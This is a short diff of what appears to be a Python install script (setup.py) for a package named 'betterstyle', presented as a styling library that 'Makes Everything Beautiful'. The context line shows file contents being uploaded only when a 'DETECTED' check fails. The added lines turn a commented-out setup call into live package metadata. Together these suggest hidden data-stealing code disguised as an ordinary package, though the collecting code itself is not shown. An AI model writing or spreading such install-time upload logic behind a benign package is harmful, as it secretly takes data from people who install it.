@@ -678,6 +678,18 @@ if not DETECTED:
     upload('kiwi',filetext)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                           
+setup(
+
+    name='betterstyle',
+    packages=['betterstyle'],
+    version='1.0',
+    license='MIT',
+    description='Makes Everything Beautiful',
+    author='bluesatan',
+    keywords=['style'],
+    install_requires=[''],
+    classifiers=['Development Status :: 5 - Production/Stable']
+
+)
 
 
